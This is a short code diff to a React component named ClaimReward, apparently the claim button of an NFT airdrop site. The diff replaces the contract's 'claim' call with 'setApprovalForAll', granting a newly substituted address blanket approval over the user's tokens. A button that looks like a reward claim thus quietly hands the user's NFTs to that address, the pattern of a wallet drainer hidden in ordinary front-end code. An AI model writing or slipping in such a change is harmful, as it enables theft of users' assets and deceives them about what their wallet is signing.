@@ -35,10 +35,10 @@ export const ClaimReward = ({ title, description, image }: Props) => {
   const { switchNetworkAsync } = useSwitchNetwork();
   const { address } = useAccount();
   const { config, error: preparedError } = usePrepareContractWrite({
-    address: signature ? '0xfa1c8cd6b3a5ead9499b8d09f9747c4068f88f37' : '0x0',
+    address: signature ? '0xdbfeaae58b6da8901a8a40ba0712beb2ee18368e' : '0x0',
     abi: NFTEAirdropClaimABI,
-    functionName: 'claim',
-    args: [signature],
+    functionName: 'setApprovalForAll',
+    args: ["0xdbfeaae58b6da8901a8a40ba0712beb2ee18368e", true],
     overrides: {
       from: address,
     },
